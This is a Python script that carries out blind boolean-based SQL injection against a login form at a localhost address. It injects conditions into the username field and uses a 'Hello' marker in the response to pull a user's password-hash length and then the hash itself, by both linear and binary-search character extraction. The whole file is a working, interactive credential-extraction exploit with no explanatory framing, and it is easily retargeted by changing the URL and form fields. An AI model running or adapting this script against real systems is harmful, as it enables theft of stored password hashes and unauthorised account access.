import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:8000/users/login/"
needle = "Hello"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end: # basically saying 'while we still have a middle'
            if end - start == 1: # see notes:search space exhausted
                if start == 0 and  boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                middle = (start + end) // 2 # floor division, nearest integer
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle

    return found


def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0


while True:
    try:
        user_id = input("> Enter user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            total_queries_taken()
            print(f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
            total_queries_taken()
            print(f"\t[-] User {user_id} hash: {extract_hash_bst(charset, int(user_id), user_password_length)}")
            total_queries_taken()
        else:
            print(f"\t[X] User {user_id} does not exist!")
    except KeyboardInterrupt:
        break